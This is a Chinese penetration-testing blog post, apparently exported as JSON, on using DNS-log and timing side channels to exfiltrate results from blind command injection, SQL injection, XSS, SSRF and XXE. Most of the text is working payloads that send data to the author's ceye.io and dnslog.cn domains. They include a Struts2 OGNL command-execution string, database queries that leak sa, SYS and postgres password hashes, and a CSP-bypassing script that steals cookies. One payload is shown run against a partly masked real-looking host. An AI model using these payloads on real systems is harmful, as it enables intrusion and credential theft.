{"title":"模糊测试之攻击回显","slug":"网安大类/FuzzTesting/模糊测试之攻击回显","date":"2019-04-17T11:34:30.000Z","updated":"2023-01-31T02:29:10.675Z","url":"2019/4-17-380.html","path":"api/articles/2019/4-17-380.html.json","covers":["https://img.weiyigeek.top/2019/1/20190813142045.png","https://img.weiyigeek.top/2019/1/20190809150048.png","https://img.weiyigeek.top/2019/1/20190813163930.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h4><p>描述：一个渗透安全工程师常常会在,某些安全测试项目中遇到,代码或者命令可以被执行,但是无任何的回显特征来判断攻击成功，</p>\n<ul>\n<li>比如存在SSRF漏洞还可以利用回显来查看是否攻击成功(大部分),但是也存在SSRF无回显漏洞以及在XXE相关的漏洞(诸如Blind XXE和Blind SSRF之类的漏洞上)利用上也需要它;</li>\n<li>再比如当再实际渗透测试中SQL盲注、命令盲注等漏洞是较难利用的由于无回显这类漏洞即使存在也显得有些鸡肋。针对此类问题我们可以使用DNSLOG来进行突破。</li>\n</ul>\n<h4 id=\"DNSlogFuzz渗透中的使用\"><a href=\"#DNSlogFuzz渗透中的使用\" class=\"headerlink\" title=\"DNSlogFuzz渗透中的使用\"></a>DNSlogFuzz渗透中的使用</h4><p>描述:DNSLOG是一种回显机制，使用者可以通过DNS解析日志来读取漏洞的回显;</p>\n<p><strong>1.DNSLOG的原理</strong><br>DNS的解析是递归与迭代相结合的，当我们访问一个根域的时候DNS的解析过程示意图,其中红色部分是可控的。<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190813142045.png\" alt=\"WeiyiGeek.参考Freebuf\" title=\"\" class=\"\">\n                <p>WeiyiGeek.参考Freebuf</p>\n            </figure></p>\n<p>我们只需要搭建一个红色部分的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p>\n<p>比如: 在 <a href=\"http://www.dnslog.cn/\" target=\"_blank\" rel=\"noopener\">http://www.dnslog.cn/</a> 中申请一个域名然后,在对其子域名进行ping操作就能看到回显;<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190809150048.png\" alt=\"WeiyiGeek.DNSLOG回显\" title=\"\" class=\"\">\n                <p>WeiyiGeek.DNSLOG回显</p>\n            </figure></p>\n<p><br></p>\n<p><strong>2.DNSlog服务器自己搭建</strong><br>当然您也可以自建一个这样的平台直接使用BugScan团队开源的工具搭建即可,前提是您需要有自己的服务器和域名，</p>\n<ul>\n<li><a href=\"https://github.com/BugScanTeam/DNSLog\" target=\"_blank\" rel=\"noopener\">https://github.com/BugScanTeam/DNSLog</a></li>\n</ul>\n<p>或者使用在线平台:</p>\n<ul>\n<li><a href=\"http://www.dnslog.cn/\" target=\"_blank\" rel=\"noopener\">http://www.dnslog.cn/</a> (推荐使用无需注册)</li>\n<li><a href=\"http://ceye.io/\" target=\"_blank\" rel=\"noopener\">http://ceye.io/</a></li>\n<li><a href=\"https://www.t00ls.net/dnslog.html\" target=\"_blank\" rel=\"noopener\">https://www.t00ls.net/dnslog.html</a></li>\n</ul>\n<p><br><br><strong>3.DNSlog使用场景和思路</strong><br><em>场景零：不同命令执行回显</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#linux下：</span></span><br><span class=\"line\">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class=\"line\">ping `whoami`.ip.port.b182oj.ceye.io</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Win下：</span></span><br><span class=\"line\">ping %USERNAME%.b182oj.ceye.io</span><br><span class=\"line\">变量                     类型       描述</span><br><span class=\"line\">%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class=\"line\">%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class=\"line\">%CD%                     本地       返回当前目录字符串。</span><br><span class=\"line\">%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class=\"line\">%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class=\"line\">%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class=\"line\">%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class=\"line\">%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class=\"line\">%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class=\"line\">%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class=\"line\">%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class=\"line\">%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class=\"line\">%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class=\"line\">%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class=\"line\">%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class=\"line\">%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class=\"line\">%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class=\"line\">%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class=\"line\">%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class=\"line\">%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class=\"line\">%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class=\"line\">%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class=\"line\">%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class=\"line\">%TIME%                   系统       返回当前时间。使用与timet 命令相同的格式。由 Cmd.ex 生成。</span><br><span class=\"line\">%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class=\"line\">%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class=\"line\">%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class=\"line\">%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure></p>\n<p><em>场景一：命令盲注回显</em><br>比如:17年9月爆发的Struts2-052反序列化命令执行漏洞是看不到任何回显的,针对这种情况我们可以利用DNSLOG来获取命令的执行结果;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Struts2</span></span><br><span class=\"line\">xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;</span><br><span class=\"line\">xx.action?redirect:<span class=\"variable\">$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;'whoami'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d<span class=\"string\">\"http://ip.port.b182oj.ceye.io/result%3d\"</span>.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(<span class=\"string\">\"GET\"</span>),%23http.connect(),%23http.getInputStream()&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Payload</span></span><br><span class=\"line\">go run main.go -u <span class=\"string\">\"http://202.114.**.***/view/index.action\"</span> -c <span class=\"string\">'curl \"http://`id`.2ojptq.dnslog.cn\"'</span></span><br><span class=\"line\"><span class=\"comment\">#回显请求</span></span><br><span class=\"line\">DNS Query Record\tIP Address\tCreated Time</span><br><span class=\"line\">root.2ojptq.dnslog.cn\t**.204.65.56\t2019-08-13 14:44:58</span><br></pre></td></tr></table></figure></p>\n<p>Playload解析：</p>\n<ul>\n<li>根据语法规定会先将双引号中的whoami命令执行并替换为结果，再执行整个的curl命令。</li>\n<li>注意为了防止内容不适合作为域名的一部分我们也可以base64编码后再进行请求。 (小技巧)<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#方式1：针对于域名base64编码</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"http://`id`.2ojptq.dnslog.cn\"</span> | base64</span><br><span class=\"line\">aHR0cDovL3VpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLjJvanB0cS5kbnNsb2cuY24K</span><br><span class=\"line\"><span class=\"comment\">#base64编码请求</span></span><br><span class=\"line\">go run main.go -u <span class=\"string\">\"http://202.114.**.***/view/index.action\"</span> -c <span class=\"string\">'curl $(echo \"aHR0cDovL3VpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLjJvanB0cS5kbnNsb2cuY24K\" | base64 -d)'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#方式2：针对于域名base64编码(需要注意URL有长度限制-推荐方式)</span></span><br><span class=\"line\">go run main.go -u <span class=\"string\">\"http://202.114.**.***/view/index.action\"</span> -c <span class=\"string\">'curl \"http://`id|base64`.2ojptq.dnslog.cn\"'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#请求结果</span></span><br><span class=\"line\">DNS Query Record\tIP Address\tCreated Time</span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root).2ojptq.dnslog.cn\t***.204.**.56\t2019-08-13 15:07:17</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><br></p>\n<p><em>场景二：SQL盲注回显</em><br>描述：我们常常遇到在 <code>bool型盲注</code> 和 <code>时间类型盲注</code>, 都需要频繁的跑请求才能够获取数据库中的值,在现代WAF的防护下很可能导致IP被ban;<br>利用方法：如遇到MySql的盲注时我们可以结合DNSLOG完美快速的将数据取出，可以利用内置函数load_file()来完成DNSLOG</p>\n<p>(小技巧): load_file()不仅能够加载本地文件同时也能对诸如\\<a href=\"http://www.test.com这样的URL发起请求。\" target=\"_blank\" rel=\"noopener\">www.test.com这样的URL发起请求。</a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#利用条件</span></span><br><span class=\"line\">1.有file权限的数据库用户</span><br><span class=\"line\">2.且开启allow_url_fopen(默认开启)</span><br><span class=\"line\">3.secure_file_priv=/date/ <span class=\"comment\">#就只能读取该目录文件</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Payload:</span></span><br><span class=\"line\">select load_file(concat(<span class=\"string\">'\\\\\\\\'</span>, user(), <span class=\"string\">'.4q9z30.dnslog.cn'</span>));</span><br><span class=\"line\">http://127.0.0.1/fuzz/?id=1 and <span class=\"keyword\">if</span>((select load_file(concat(0x7c,(select database()),<span class=\"string\">'.4q9z30.dnslog.cn'</span>))),1,1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查看执行效果 (非常鸡肋,不容易成功)</span></span><br><span class=\"line\">root@localhost.4q9z30.dnslog.cn **.**.**.** \t2019-07-27 09:45</span><br></pre></td></tr></table></figure>\n<p>补充利用：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#SQL Server</span></span><br><span class=\"line\">DECLARE @host varchar(1024);</span><br><span class=\"line\">SELECT @host=(SELECT TOP 1</span><br><span class=\"line\">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class=\"line\">FROM sys.sql_logins WHERE name=<span class=\"string\">'sa'</span>)</span><br><span class=\"line\">+<span class=\"string\">'.ip.port.b182oj.ceye.io'</span>;</span><br><span class=\"line\">EXEC(<span class=\"string\">'master..xp_dirtree</span></span><br><span class=\"line\"><span class=\"string\">\"\\\\'</span>+@host+<span class=\"string\">'\\foobar$\"'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Oracle</span></span><br><span class=\"line\">SELECT UTL_INADDR.GET_HOST_ADDRESS(<span class=\"string\">'ip.port.b182oj.ceye.io'</span>);</span><br><span class=\"line\">SELECT UTL_HTTP.REQUEST(<span class=\"string\">'http://ip.port.b182oj.ceye.io/oracle'</span>) FROM DUAL;</span><br><span class=\"line\">SELECT HTTPURITYPE(<span class=\"string\">'http://ip.port.b182oj.ceye.io/oracle'</span>).GETCLOB() FROM DUAL;</span><br><span class=\"line\">SELECT DBMS_LDAP.INIT((<span class=\"string\">'oracle.ip.port.b182oj.ceye.io'</span>,80) FROM DUAL;</span><br><span class=\"line\">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=<span class=\"string\">'SYS'</span>)||<span class=\"string\">'.ip.port.b182oj.ceye.io'</span>,80) FROM DUAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#PostgreSQL</span></span><br><span class=\"line\">DROP TABLE IF EXISTS table_output;</span><br><span class=\"line\">CREATE TABLE table_output(content text);</span><br><span class=\"line\">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class=\"line\">RETURNS VOID AS $</span><br><span class=\"line\">DECLARE exec_cmd TEXT;</span><br><span class=\"line\">DECLARE query_result TEXT;</span><br><span class=\"line\">BEGIN</span><br><span class=\"line\">SELECT INTO query_result (SELECT passwd</span><br><span class=\"line\">FROM pg_shadow WHERE usename=<span class=\"string\">'postgres'</span>);</span><br><span class=\"line\">exec_cmd := E<span class=\"string\">'COPY table_output(content)</span></span><br><span class=\"line\"><span class=\"string\">FROM E\\'</span>\\\\\\\\\\\\\\\\<span class=\"string\">'||query_result||E'</span>.psql.ip.port.b182oj.ceye.io\\\\\\\\foobar.txt\\<span class=\"string\">''</span>;</span><br><span class=\"line\">EXECUTE exec_cmd;</span><br><span class=\"line\">END;</span><br><span class=\"line\">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class=\"line\">SELECT temp_function();</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><em>场景三： XSS绕过CSP</em><br>描述:CSP(内容安全策略)是防御XSS最有效的手段之一,当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外导致此XSS无法利用；对此我们可以使用DNS预解析突破CSP的阻拦。</p>\n<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术对于跨站的链接，由于每次都要进行一次DNS解析会消耗掉很多时间。<br>DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。</p>\n<p>有趣的是DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>(重点)<code>由于DNS预解析可以绕过CSP进行解析</code>(重点)，结合DNSLOG我们即可窃取在CSP保护下的Cookie。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Payload</span></span><br><span class=\"line\">document.querySelector(<span class=\"string\">'body'</span>).innerHTML += <span class=\"string\">\"&lt;link rel='dns-prefetch' href='\"</span> + window.btoa(document.cookie.split(/;|=/)[1]) + <span class=\"string\">\".4q9z30.dnslog.cn'&gt;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#执行结果</span></span><br><span class=\"line\">R0ExLjIuMTY0MjI2NDMxNi4xNTMyNTc0NTg3.4q9z30.dnslog.cn **.**.**.** \t2019-07-27 10:45</span><br></pre></td></tr></table></figure></p>\n<p><em>注意事项：</em></p>\n<ul>\n<li>根据DNS的规定域名的长度是有限制的，有时可能无法将长Cookie完全带出(需要进行分段)</li>\n</ul>\n<p><br></p>\n<p><em>场景四:SSRF无回显解决</em><br>描述：很多SSRF的漏洞类型都是无回显,利用DNS回显来查看利用：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Playload:</span></span><br><span class=\"line\">http://10.10.107.1:8080/ssrf.php?url=http://php.nf9eex.dnslog.cn</span><br></pre></td></tr></table></figure></p>\n<p><br><br><em>场景五:XXE无回显解决</em><br>描述：与xml格式相关的web漏洞传比较广泛的共有 xpath注入、xml注入、soap注入、XXE四种,在进行测试的时候往往也会遇到无回显的情况;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span>?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE root [</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM <span class=\"string\">\"http://ip.port.b182oj.ceye.io/xxe_test\"</span>&gt;</span><br><span class=\"line\">%remote;]&gt;</span><br><span class=\"line\">&lt;root/&gt;</span><br></pre></td></tr></table></figure></p>\n<p><br><br><em>场景六:其他漏洞攻击无回显解决</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#FFMpeg</span></span><br><span class=\"line\"><span class=\"comment\">#EXTM3U</span></span><br><span class=\"line\"><span class=\"comment\">#EXT-X-MEDIA-SEQUENCE:0</span></span><br><span class=\"line\"><span class=\"comment\">#EXTINF:10.0,</span></span><br><span class=\"line\">concat:http://ip.port.b182oj.ceye.io</span><br><span class=\"line\"><span class=\"comment\">#EXT-X-ENDLIST</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Weblogic</span></span><br><span class=\"line\">xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/<span class=\"built_in\">test</span>&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ImageMagick</span></span><br><span class=\"line\">push graphic-context</span><br><span class=\"line\">viewbox 0 0 640 480</span><br><span class=\"line\">fill <span class=\"string\">'url(http://ip.port.b182oj.ceye.io)'</span></span><br><span class=\"line\">pop graphic-context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Resin</span></span><br><span class=\"line\">xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/<span class=\"built_in\">test</span>?inputFile=http://ip.port.b182oj.ceye.io/ssrf</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</span><br></pre></td></tr></table></figure></p>\n<p><em>参考来源：</em></p>\n<ul>\n<li>DNSlog原理: <a href=\"https://www.freebuf.com/column/184587.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/column/184587.html</a></li>\n<li>渗透使用方法: <a href=\"http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html\" target=\"_blank\" rel=\"noopener\">http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html</a></li>\n</ul>\n<hr>\n\n<h4 id=\"Timeout回显\"><a href=\"#Timeout回显\" class=\"headerlink\" title=\"Timeout回显\"></a>Timeout回显</h4><p>描述：对于ssrf但是它有个通用的特点就是它发起的请求往往都是有 Apache-HttpClient 这款容器发起的。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.1</span><span class=\"number\">.1</span><span class=\"number\">.1</span> - weiygeek.com/&amp;referer=none  - Apache-HttpClient/x.x (Java x.x minimum; Java/x.x<span class=\"number\">.0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#测试脚本代码</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_allowed_URL</span><span class=\"params\">($url)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//可用来防止HTTP头注入</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">//仅允许http或https协议</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^https?:\\/\\/.*$/'</span>, $url))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">       </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!is_allowed_URL($_GET[<span class=\"string\">'url'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'非法'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//打开输出缓冲区并获取远程图片</span></span><br><span class=\"line\">ob_start();</span><br><span class=\"line\">$context = stream_context_create(</span><br><span class=\"line\">    <span class=\"keyword\">array</span>(<span class=\"string\">'http'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">'follow_location'</span> =&gt; <span class=\"keyword\">false</span> <span class=\"comment\">// don't follow redirects</span></span><br><span class=\"line\">    ))</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//略</span></span><br><span class=\"line\">$ch = curl_init();</span><br><span class=\"line\">$timeout = <span class=\"number\">10</span>;</span><br><span class=\"line\">curl_setopt ($ch, CURLOPT_URL, $_GET[<span class=\"string\">'url'</span>]);</span><br><span class=\"line\">curl_setopt ($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</span><br><span class=\"line\">$url = curl_exec($ch);</span><br><span class=\"line\">ob_end_clean();</span><br></pre></td></tr></table></figure></p>\n<p>有两种知识：</p>\n<ul>\n<li>“根据端口的响应时间判断端口是否存活:” <a href=\"http://192.168.1.1/ssrf.php?url=http://127.0.0.1:$80$\" target=\"_blank\" rel=\"noopener\">http://192.168.1.1/ssrf.php?url=http://127.0.0.1:$80$</a><ul>\n<li>Tips:采用Burpsuite测试遍历端口时记得把<code>Intruder attack -- columns -- Response received</code>打勾<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190813163930.png\" alt=\"WeiyiGeek.burpsuiter-SSRF-test\" title=\"\" class=\"\">\n                <p>WeiyiGeek.burpsuiter-SSRF-test</p>\n            </figure></li>\n</ul>\n</li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"网安大类","path":"api/categories/网安大类.json"}],"tags":[{"name":"Fuzz","path":"api/tags/Fuzz.json"}]}